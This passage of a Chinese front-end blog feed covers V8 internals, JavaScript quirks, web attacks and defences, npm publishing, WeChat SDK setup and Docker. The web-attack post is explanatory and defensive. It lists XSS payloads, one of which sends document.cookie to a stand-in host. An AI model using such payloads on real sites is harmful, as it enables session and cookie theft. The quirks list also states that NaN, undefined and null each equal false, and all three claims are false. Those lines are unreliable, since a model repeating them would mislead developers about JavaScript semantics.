class="keyword">function</span> <span class="title function_">sum</span>(<span class="params">x, y</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">sum</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line"><span class="title function_">sum</span>(<span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"><span class="title function_">sum</span>(<span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line"><span class="title function_">sum</span>(<span class="string">&quot;7&quot;</span>, <span class="string">&quot;8&quot;</span>); <span class="comment">//会回退字节码操作执行</span></span><br></pre></td></tr></table></figure><p><a href="https://www.bilibili.com/video/BV1zV411z7RX">参考视频（原文作者）</a></p>]]></content>
      
      
      <categories>
          
          <category> FrontEnd-Tec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
            <tag> node </tag>
            
            <tag> v8 </tag>
            
            <tag> parser </tag>
            
            <tag> interpreter </tag>
            
            <tag> compiler </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javascript运行原理(一)</title>
      <link href="/2022/03/11/js-runtime1/"/>
      <url>/2022/03/11/js-runtime1/</url>
      
        <content type="html"><![CDATA[<h4 id="JS-的语言组成"><a href="#JS-的语言组成" class="headerlink" title="JS 的语言组成"></a>JS 的语言组成</h4><ul><li>基本语法：C</li><li>数据类型: Java 内存管理：</li><li>函数式编程: Scheme 函数是第一等公民</li><li>原型继承：Self 基于原型 prototype 的继承机制</li></ul><img width="500" align="center" src="/images/js-runtime/1.png" alt="ronaldoxzb" /><h4 id="语言特性"><a href="#语言特性" class="headerlink" title="语言特性"></a>语言特性</h4><ul><li>动态类型语言 JS 编译环境 JIT Just In Time Compilation <code>在运行时编译成机器代码</code></li><li>静态类型语言 C++ 编译环境 AOT Ahead Of Time <code>在运行前提前生成好机器代码</code></li></ul><h4 id="JS-引擎"><a href="#JS-引擎" class="headerlink" title="JS 引擎"></a>JS 引擎</h4><p>将 js 代码编译成机器能够识别的代码，常见的有：</p><ul><li>谷歌 - V8</li><li>苹果 - javaScriptCore</li><li>火狐 - SpideMonkey</li><li>QuickJs</li><li>FaceBook - Hermes</li></ul><img width="500" align="center" src="/images/js-runtime/2.png" alt="ronaldoxzb" />#### 奇葩的JS<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">&#x27;b&#x27;</span>+<span class="string">&#x27;a&#x27;</span>+ + <span class="string">&#x27;a&#x27;</span>+<span class="string">&#x27;a&#x27;</span>+ +<span class="string">&#x27;&#x27;</span>).<span class="title function_">toLowerCase</span>() <span class="comment">//&quot;banana0&quot;</span></span><br><span class="line"><span class="number">0</span> == <span class="string">&#x27;0&#x27;</span>  <span class="comment">//true</span></span><br><span class="line"><span class="number">0</span> == []  <span class="comment">//true</span></span><br><span class="line"><span class="string">&#x27;0&#x27;</span> == []  <span class="comment">//false</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="title class_">NaN</span>  <span class="comment">//number</span></span><br><span class="line"><span class="number">99999999999</span> <span class="comment">//100000000000</span></span><br><span class="line"><span class="number">0.1</span>+<span class="number">0.2</span>==<span class="number">0.3</span> <span class="comment">//false 精度丢失</span></span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">max</span>() <span class="comment">//-Infinity  负无穷</span></span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">min</span>() <span class="comment">//Infinity  正无穷</span></span><br><span class="line">[] + []  <span class="comment">//&quot;&quot;</span></span><br><span class="line">[] + &#123;&#125;  <span class="comment">//&quot;【object object】&quot;</span></span><br><span class="line">&#123;&#125; + []  <span class="comment">// 0</span></span><br><span class="line"><span class="literal">true</span> + <span class="literal">true</span> + <span class="literal">true</span>===<span class="number">3</span>  <span class="comment">//true</span></span><br><span class="line"><span class="literal">true</span> - <span class="literal">true</span>  <span class="comment">//0</span></span><br><span class="line">(!+[]+[]+![]).<span class="property">length</span> <span class="comment">//9 &quot;truefalse&quot;</span></span><br><span class="line"><span class="number">9</span> + <span class="string">&quot;1&quot;</span>  <span class="comment">//91</span></span><br><span class="line"><span class="number">91</span> - <span class="string">&quot;1&quot;</span>  <span class="comment">//90</span></span><br><span class="line">[] == <span class="literal">false</span>  <span class="comment">//true</span></span><br><span class="line"><span class="number">0</span>==<span class="literal">false</span>  <span class="comment">//true</span></span><br><span class="line"><span class="literal">undefined</span> == <span class="literal">false</span>  <span class="comment">//true</span></span><br><span class="line"><span class="title class_">NaN</span> == <span class="literal">false</span>  <span class="comment">//true</span></span><br><span class="line"><span class="string">&quot;&quot;</span> == <span class="literal">false</span>  <span class="comment">//true  包括多空格</span></span><br><span class="line"><span class="literal">null</span> == <span class="literal">false</span>  <span class="comment">//true</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="JS-编译流程"><a href="#JS-编译流程" class="headerlink" title="JS 编译流程"></a>JS 编译流程</h4><ol><li>parser - 将 js 源码通过 parser 解析器生成 AST 抽象语法树<img width="500" align="center" src="/images/js-runtime/3.png" alt="ronaldoxzb" /></li><li>interpreter - 通过解释器将 AST 编程成功字节码 bytecode (字节码与平台无关，是中间层，可以在各个平台上运行)<img width="500" align="center" src="/images/js-runtime/4.png" alt="ronaldoxzb" /></li><li>compiler - 根据当前平台编译出相应的机器代码也就是汇编代码 常见的操作系统平台有：IA32 X64 ARM MIPS<img width="500" align="center" src="/images/js-runtime/5.png" alt="ronaldoxzb" /></li></ol><p><a href="https://www.bilibili.com/video/BV1vh411Z7QG">参考视频（原文作者）</a></p>]]></content>
      
      
      <categories>
          
          <category> FrontEnd-Tec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
            <tag> node </tag>
            
            <tag> v8 </tag>
            
            <tag> parser </tag>
            
            <tag> interpreter </tag>
            
            <tag> compiler </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见的web攻击及防范</title>
      <link href="/2022/03/08/web-attack/"/>
      <url>/2022/03/08/web-attack/</url>
      
        <content type="html"><![CDATA[<h2 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h2><blockquote><p>所谓 SQL 注入，就是通过把 SQL 命令插入到 Web 表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL 命令。</p></blockquote><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p>SQL 注入攻击指的是通过构建特殊的输入作为参数传入 Web 应用程序，而这些输入大都是 SQL 语法里的一些组合，通过执行 SQL 语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。</p><h3 id="被攻击的原因"><a href="#被攻击的原因" class="headerlink" title="被攻击的原因:"></a>被攻击的原因:</h3><blockquote><p>sql 语句伪造参数，然后在对参数进行拼接的后形成破坏性的 sql 语句，最后导致数据库受到攻击</p></blockquote><h3 id="防护："><a href="#防护：" class="headerlink" title="防护："></a>防护：</h3><ul><li>永远不要信任用户的输入。对用户的输入进行校验，可以通过正则表达式，或限制长度；对单引号和双”-“进行转换等。</li><li>永远不要使用动态拼装 sql，可以使用参数化的 sql 或者直接使用存储过程进行数据查询存取。</li><li>永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。</li><li>不要把机密信息直接存放，加密或者 hash 掉密码和敏感的信息。</li><li>应用的异常信息应该给出尽可能少的提示，最好使用自定义的错误信息对原始错误信息进行包装</li><li>sql 注入的检测方法一般采取辅助软件或网站平台来检测，软件一般采用 sql 注入检测工具 jsky，网站平台就有亿思网站安全平台检测工具。MDCSOFT SCAN 等。采用 MDCSOFT-IPS 可以有效的防御 SQL 注入，XSS 攻击等。</li><li>7.使用预编译语句(PreparedStatement)，这样的话即使我们使用 sql 语句伪造成参数，到了服务端的时候，这个伪造 sql 语句的参数也只是简单的字符，并不能起到攻击的作用。</li></ul><h2 id="跨站脚本攻击-XSS"><a href="#跨站脚本攻击-XSS" class="headerlink" title="跨站脚本攻击(XSS)"></a>跨站脚本攻击(XSS)</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>跨站脚本攻击（XSS，Cross-site scripting）是最常见和基本的攻击 WEB 网站的方法。攻击者在网页上发布包含攻击性代码的数据。当浏览者看到此网页时，特定的脚本就会以浏览者用户的身份和权限来执行。通过 XSS 可以比较容易地修改用户数据、窃取用户信息，以及造成其它类型的攻击，例如 CSRF 攻击</p><h3 id="被攻击的原因-1"><a href="#被攻击的原因-1" class="headerlink" title="被攻击的原因"></a>被攻击的原因</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">- &lt;script&gt;alert(&quot;反射型 XSS 攻击&quot;)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">- &lt;script&gt;alert(‘xss’)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">- &lt;a href=&#x27;&#x27; onclick=alert(&#x27;xss&#x27;)&gt;type&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">- &lt;img src=http://1.1.1.1/a.jpg onerror=alert(&#x27;xss&#x27;)&gt;</span><br><span class="line"></span><br><span class="line">- &lt;script&gt;window.location=‘http://192.168.1.1&#x27;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">- &lt;iframe SRC=&quot;http://1.1.1.1/a.jpg&quot; height = &quot;0&quot; width =&quot;0&quot;&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">- &lt;script&gt;new Image().src=&quot;http://1.1.1.1/c.php?output=&quot;+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure><blockquote><p>用户输入的数据变成了代码，比如说上面的 script,应该只是字符串却有了代码的作用。</p></blockquote><h3 id="三种方式"><a href="#三种方式" class="headerlink" title="三种方式"></a>三种方式</h3><p><code>反射型 XSS </code></p><p>只是简单地把用户输入的数据 “反射” 给浏览器，这种攻击方式往往需要攻击者诱使用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。</p><p>访问 localhost:3000 页面上的恶意链接,恶意链接的地址指向了 localhost:8001,我们启动一个 8001 的服务,这样就产生了反射型 XSS 攻击。攻击者可以注入任意的恶意脚本进行攻击，可能注入恶作剧脚本，或者注入能获取用户隐私数据(如 cookie)的脚本，这取决于攻击者的目的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">const http = require(&#x27;http&#x27;);</span><br><span class="line">function handleReequest(req, res) &#123;</span><br><span class="line">    res.setHeader(&#x27;Access-Control-Allow-Origin&#x27;, &#x27;*&#x27;);</span><br><span class="line">    res.writeHead(200, &#123;&#x27;Content-Type&#x27;: &#x27;text/html; charset=UTF-8&#x27;&#125;);</span><br><span class="line">    res.write(&#x27;&lt;script&gt;alert(&quot;反射型 XSS 攻击&quot;)&lt;/script&gt;&#x27;);</span><br><span class="line">    res.end();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const server = new http.Server();</span><br><span class="line">server.listen(8001, &#x27;127.0.0.1&#x27;);</span><br><span class="line">server.on(&#x27;request&#x27;, handleReequest);</span><br></pre></td></tr></table></figure><p><code>存储型</code></p><p>存储型 XSS 会把用户输入的数据 “存储” 在服务器端，当浏览器请求数据时，脚本从服务器上传回并执行。这种 XSS 攻击具有很强的稳定性。</p><p>比较常见的一个场景是攻击者在社区或论坛上写下一篇包含恶意 JavaScript 代码的文章或评论，文章或评论发表后，所有访问该文章或评论的用户，都会在他们的浏览器中执行这段恶意的 JavaScript 代码。</p><p><code>基于DOM</code></p><p>基于 DOM 的 XSS 攻击是指通过恶意脚本修改页面的 DOM 结构，是纯粹发生在客户端的攻击。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2&gt;XSS: &lt;/h2&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; id=&quot;input&quot;&gt;</span><br><span class="line">&lt;button id=&quot;btn&quot;&gt;Submit&lt;/button&gt;</span><br><span class="line">&lt;div id=&quot;div&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    const input = document.getElementById(&#x27;input&#x27;);</span><br><span class="line">    const btn = document.getElementById(&#x27;btn&#x27;);</span><br><span class="line">    const div = document.getElementById(&#x27;div&#x27;);</span><br><span class="line"></span><br><span class="line">    let val;</span><br><span class="line"></span><br><span class="line">    input.addEventListener(&#x27;change&#x27;, (e) =&gt; &#123;</span><br><span class="line">        val = e.target.value;</span><br><span class="line">    &#125;, false);</span><br><span class="line"></span><br><span class="line">    btn.addEventListener(&#x27;click&#x27;, () =&gt; &#123;</span><br><span class="line">        div.innerHTML = `&lt;a href=$&#123;val&#125;&gt;testLink&lt;/a&gt;`</span><br><span class="line">    &#125;, false);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>点击 Submit 按钮后，会在当前页面插入一个链接，其地址为用户的输入内容。如果用户在输入时构造了如下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27; onclick=alert(/xss/)</span><br></pre></td></tr></table></figure><p>用户提交之后，页面代码就变成了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href onlick=&quot;alert(/xss/)&quot;&gt;testLink&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/7871813/42721109-cb7ce572-8766-11e8-96d9-9ada8a787827.gif"></p><h3 id="防护：-1"><a href="#防护：-1" class="headerlink" title="防护："></a>防护：</h3><ul><li>确保输出到 HTML 页面的数据以 HTML 的方式被转义</li><li>前端框架中，都会有一份 decodingMap， 用于对用户输入所包含的特殊字符或标签进行编码或过滤，如 &lt;，&gt;，script，防止 XSS 攻击：</li><li>设置 HttpOnly 严格来说，HttpOnly 并非阻止 XSS 攻击，而是能阻止 XSS 攻击后的 Cookie 劫持攻击。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// vuejs 中的 decodingMap</span><br><span class="line">// 在 vuejs 中，如果输入带 script 标签的内容，会直接过滤掉</span><br><span class="line">const decodingMap = &#123;</span><br><span class="line">  &#x27;&amp;lt;&#x27;: &#x27;&lt;&#x27;,</span><br><span class="line">  &#x27;&amp;gt;&#x27;: &#x27;&gt;&#x27;,</span><br><span class="line">  &#x27;&amp;quot;&#x27;: &#x27;&quot;&#x27;,</span><br><span class="line">  &#x27;&amp;amp;&#x27;: &#x27;&amp;&#x27;,</span><br><span class="line">  &#x27;&amp;#10;&#x27;: &#x27;\n&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="跨站请求伪造攻击（CSRF"><a href="#跨站请求伪造攻击（CSRF" class="headerlink" title="跨站请求伪造攻击（CSRF)"></a>跨站请求伪造攻击（CSRF)</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>跨站请求伪造（CSRF，Cross-site request forgery）是另一种常见的攻击。攻击者通过各种方法伪造一个请求，模仿用户提交表单的行为，从而达到修改用户的数据，或者执行特定任务的目的。为了假冒用户的身份，CSRF 攻击常常和 XSS 攻击配合起来做，但也可以通过其它手段，例如诱使用户点击一个包含攻击的链接</p><h3 id="被攻击的原因："><a href="#被攻击的原因：" class="headerlink" title="被攻击的原因："></a>被攻击的原因：</h3><ul><li><p>用户本地存储 cookie，攻击者利用用户的 cookie 进行认证，然后伪造用户发出请求</p></li><li><p>之所以被攻击是因为攻击者利用了存储在浏览器用于用户认证的 cookie，那么如果我们不用 cookie 来验证不就可以预防了。所以我们可以采用 token（不存储于浏览器）认证，为每一个提交的表单生成一个随机 token， 存储在 session 中，每次验证表单 token，检查 token 是否正确。。</p></li><li><p>通过 referer 识别，HTTP Referer 是 header 的一部分，当浏览器向 web 服务器发送请求的时候，一般会带上 Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。那么这样的话，我们必须登录银行 A 网站才能进行转账了。</p></li></ul><h3 id="防护：-2"><a href="#防护：-2" class="headerlink" title="防护："></a>防护：</h3><ul><li>采用 POST 请求,增加攻击的难度.用户点击一个链接就可以发起 GET 类型的请求。而 POST 请求相对比较难，攻击者往往需要借助 javascript 才能实现</li><li>对请求进行认证，确保该请求确实是用户本人填写表单并提交的，而不是第三者伪造的.具体可以在会话中增加 token,确保看到信息和提交信息的是同一个人</li></ul>]]></content>
      
      
      <categories>
          
          <category> FrontEnd-Tec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
            <tag> web </tag>
            
            <tag> xss </tag>
            
            <tag> csrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何优雅的发布npm包</title>
      <link href="/2022/02/10/npm-publish/"/>
      <url>/2022/02/10/npm-publish/</url>
      
        <content type="html"><![CDATA[<h4 id="一、nrm管理镜像源"><a href="#一、nrm管理镜像源" class="headerlink" title="一、nrm管理镜像源"></a>一、nrm管理镜像源</h4><h4 id="前提是搭好npm私有服务器"><a href="#前提是搭好npm私有服务器" class="headerlink" title="前提是搭好npm私有服务器"></a>前提是搭好npm私有服务器</h4><blockquote><p>我们可以更改npm源为本地地址：</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置npm使用的源为本地私服</span></span><br><span class="line">npm <span class="built_in">set</span> registry http://localhost:4873/</span><br></pre></td></tr></table></figure><blockquote><p>或者针对某个依赖安装时选用自己的源地址：</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install lodash --registry http://localhost:4873</span><br></pre></td></tr></table></figure><blockquote><p>　但是如果我们想再次切换到淘宝或者其他的镜像地址，就不那么方便了；我们可以通过nrm这个工具来管理我们的源地址，可以查看和切换地址；首先还是进行安装：</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g nrm</span><br></pre></td></tr></table></figure><blockquote><p>安装后我们可以通过<code>nrm add [name] [address]</code>这个命令来新增一个源地址：</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nrm add localnpm http://localhost:4873/</span><br></pre></td></tr></table></figure><blockquote><p>　使用nrm ls可以查看我们使用的所有源地址，带*是正在使用的地址；通过nrm use [name]来切换地址：</p></blockquote><p><img src="https://ronaldoxzb.com/upload/2022/02/WeChatc9c7dcbf4fa55e66761034cb45c3d0df-9dc29e918d2e483696ef9288f9bea7ba.png" alt="WeChatc9c7dcbf4fa55e66761034cb45c3d0df.png"></p><h4 id="二、npm发布包"><a href="#二、npm发布包" class="headerlink" title="二、npm发布包"></a>二、npm发布包</h4><blockquote><p>首先我们需要准备一个账号，可以使用–registry来指定npm服务器，或者直接使用nrm来管理</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm adduser</span><br><span class="line">npm adduser --registry=http://example.com</span><br></pre></td></tr></table></figure><blockquote><p>然后进行登录，输入你注册的账号密码邮箱：</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm login</span><br></pre></td></tr></table></figure><blockquote><p>还可以用下面命令退出当前账号：</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm <span class="built_in">logout</span></span><br></pre></td></tr></table></figure><blockquote><p>如果不知道当前登录的账号可以用who命令查看身份：</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm <span class="built_in">who</span> am i</span><br></pre></td></tr></table></figure><blockquote><p>登录成功就可以将我们的包推送到服务器上去了，执行下面命令，会看到一堆的npm notice：</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm publish</span><br></pre></td></tr></table></figure><blockquote><p>如果某版本的包有问题，我们还可以将其撤回</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm unpublish [pkg]@[version]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> FrontEnd-Tec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sh </tag>
            
            <tag> npm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信js-sdk配置流程（测试号与公众号配置）</title>
      <link href="/2021/10/14/wx-jssdk/"/>
      <url>/2021/10/14/wx-jssdk/</url>
      
        <content type="html"><![CDATA[<h3 id="一、微信公号后台配置"><a href="#一、微信公号后台配置" class="headerlink" title="一、微信公号后台配置"></a>一、微信公号后台配置</h3><h4 id="1、获取-AppID、AppSecret"><a href="#1、获取-AppID、AppSecret" class="headerlink" title="1、获取 AppID、AppSecret"></a>1、获取 AppID、AppSecret</h4><blockquote><h5 id="测试号可从微信测试号申请获取-这样就获得了-AppID-与-AppSecret"><a href="#测试号可从微信测试号申请获取-这样就获得了-AppID-与-AppSecret" class="headerlink" title="测试号可从微信测试号申请获取,这样就获得了 AppID 与 AppSecret"></a><code>测试号</code>可从<a href="http://mp.weixin.qq.com/debug/cgi-bin/sandboxinfo?action=showinfo&t=sandbox/index">微信测试号申请</a>获取,这样就获得了 AppID 与 AppSecret</h5></blockquote><img width="40%" align="ceter" src="https://z3.ax1x.com/2021/10/14/5lMgQx.png" alt="ronaldoxzb" /></p><blockquote><h5 id="公众号申请自行操作申请完成后在公众号后台设置与开发基本配置中获取"><a href="#公众号申请自行操作申请完成后在公众号后台设置与开发基本配置中获取" class="headerlink" title="公众号申请自行操作申请完成后在公众号后台设置与开发基本配置中获取"></a><code>公众号申请自行操作</code>申请完成后在公众号后台<code>设置与开发</code>基本配置中获取</h5></blockquote><img width="40%" align="ceter" src="https://z3.ax1x.com/2021/10/20/5BJtIK.png" alt="ronaldoxzb" /><h4 id="2、配置-AppID、AppSecret"><a href="#2、配置-AppID、AppSecret" class="headerlink" title="2、配置 AppID、AppSecret"></a>2、配置 AppID、AppSecret</h4><blockquote><h5 id="获取到AppID、AppSecret后，可在程序中配置"><a href="#获取到AppID、AppSecret后，可在程序中配置" class="headerlink" title="获取到AppID、AppSecret后，可在程序中配置"></a><code>获取到AppID、AppSecret后，可在程序中配置</code></h5></blockquote><h4 id="3、IP-白名单添加（需要服务器-ip）"><a href="#3、IP-白名单添加（需要服务器-ip）" class="headerlink" title="3、IP 白名单添加（需要服务器 ip）"></a>3、IP 白名单添加（需要服务器 ip）</h4><blockquote><h5 id="添加IP白名单来调用获取ACCESS-TOKEN的接口"><a href="#添加IP白名单来调用获取ACCESS-TOKEN的接口" class="headerlink" title="添加IP白名单来调用获取ACCESS_TOKEN的接口"></a><code>添加IP白名单来调用获取ACCESS_TOKEN的接口</code></h5></blockquote><img width="40%" align="ceter" src="https://z3.ax1x.com/2021/10/20/5BYUwq.png" alt="ronaldoxzb" /><h4 id="4、配置服务器地址（与微信通信检查）"><a href="#4、配置服务器地址（与微信通信检查）" class="headerlink" title="4、配置服务器地址（与微信通信检查）"></a>4、配置服务器地址（与微信通信检查）</h4><blockquote><h5 id="程序中写好通信接口，配置好路由，可查看图片中标记"><a href="#程序中写好通信接口，配置好路由，可查看图片中标记" class="headerlink" title="程序中写好通信接口，配置好路由，可查看图片中标记"></a><code>程序中写好通信接口，配置好路由，可查看图片中标记</code></h5><h5 id="慎重操作下图中的启用-停用按钮，会把公众号配置好的菜单下架掉（点击停用后可重新找回）"><a href="#慎重操作下图中的启用-停用按钮，会把公众号配置好的菜单下架掉（点击停用后可重新找回）" class="headerlink" title="慎重操作下图中的启用/停用按钮，会把公众号配置好的菜单下架掉（点击停用后可重新找回）"></a><code>慎重操作下图中的启用/停用按钮，会把公众号配置好的菜单下架掉（点击停用后可重新找回）</code></h5></blockquote><img width="40%" align="ceter" src="https://z3.ax1x.com/2021/10/20/5BYYOs.png" alt="ronaldoxzb" /><h4 id="5、配置接口安全域名，成功调用-jssdk-（需要域名）"><a href="#5、配置接口安全域名，成功调用-jssdk-（需要域名）" class="headerlink" title="5、配置接口安全域名，成功调用 jssdk （需要域名）"></a>5、配置接口安全域名，成功调用 jssdk （需要域名）</h4><blockquote><h5 id="配置安全域名目录见下图"><a href="#配置安全域名目录见下图" class="headerlink" title="配置安全域名目录见下图"></a><code>配置安全域名目录见下图</code></h5></blockquote><img width="40%" align="ceter" src="https://z3.ax1x.com/2021/10/20/5BYNmn.png" alt="ronaldoxzb" /></p><blockquote><h5 id="配置域名前注意下图中的表述，上传文件至服务器，验证服务器是否是你本人所有，域名的合规性。"><a href="#配置域名前注意下图中的表述，上传文件至服务器，验证服务器是否是你本人所有，域名的合规性。" class="headerlink" title="配置域名前注意下图中的表述，上传文件至服务器，验证服务器是否是你本人所有，域名的合规性。"></a><code>配置域名前注意下图中的表述，上传文件至服务器，验证服务器是否是你本人所有，域名的合规性。</code></h5></blockquote><img width="40%" align="ceter" src="https://z3.ax1x.com/2021/10/20/5BYJyj.png" alt="ronaldoxzb" /><h4 id="到此配置流程已结束，之后会出一片代码配置文章。"><a href="#到此配置流程已结束，之后会出一片代码配置文章。" class="headerlink" title="到此配置流程已结束，之后会出一片代码配置文章。"></a>到此配置流程已结束，之后会出一片代码配置文章。</h4>]]></content>
      
      
      <categories>
          
          <category> FrontEnd-Tec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
            <tag> wx-jssdk </tag>
            
            <tag> wx-config </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker相关</title>
      <link href="/2021/08/31/docker/"/>
      <url>/2021/08/31/docker/</url>
      
        <content type="html"><![CDATA[<p><img width="300" align="center" src="/images/dockerlogo.png" alt="ronaldoxzb" /></p></p><h3 id="一、集装箱？"><a href="#一、集装箱？" class="headerlink" title="一、集装箱？"></a>一、集装箱？</h3><p>来自于知乎的通俗解释：<br>Docker 的思想来自于 集装箱，集装箱解决了什么问题？在一艘大船上，可以把货物规整的摆放起来。并且各种各样的货物被集装箱标准化了，集装箱和集装箱之间不会互相影响。那么我就不需要专门运送水果的船和专门运送化学品的船了。只要这些货物在集装箱里封装的好好的，那我就可以用一艘大船把他们都运走。</p><h3 id="docker-核心概念"><a href="#docker-核心概念" class="headerlink" title="docker 核心概念"></a>docker 核心概念</h3><h4 id="镜像-image"><a href="#镜像-image" class="headerlink" title="镜像(image)"></a>镜像(image)</h4><p><code>类似于虚拟机中的镜像（image），是一个包含有文件系统的面向Docker引擎的只读模板。任何应用程序运行都需要环境，而镜像就是用来提供这种运行环境的。镜像可以用来创建 Docker 容器</code></p><h4 id="仓库-repository-node-js-镜像仓库"><a href="#仓库-repository-node-js-镜像仓库" class="headerlink" title="仓库(repository) node.js 镜像仓库"></a>仓库(repository) <a href="https://hub.docker.com/_/node">node.js 镜像仓库</a></h4><p><code>仓库（Repository）是集中存放镜像文件的场所。类似于代码仓库，这里是镜像仓库。</code></p><h4 id="容器-container"><a href="#容器-container" class="headerlink" title="容器(container)"></a>容器(container)</h4><p><code>Docker 利用容器（Container）来运行应用。容器是从镜像创建的运行实例。可以看作一个简易版的 Linux 环境</code></p><h4 id="对比记忆"><a href="#对比记忆" class="headerlink" title="对比记忆"></a>对比记忆</h4><blockquote><p>Java 号称“一次编译，到处运行”，因为 java 虚拟机解决平台的兼容性问题，所以有 java 虚拟机的地方就能跑 java 代码；</p></blockquote><blockquote><p>Docker 是：“一次封装，到处运行”，因为 docker 解决了应用环境的问题，安装了 docker 的平台就能跑“docker 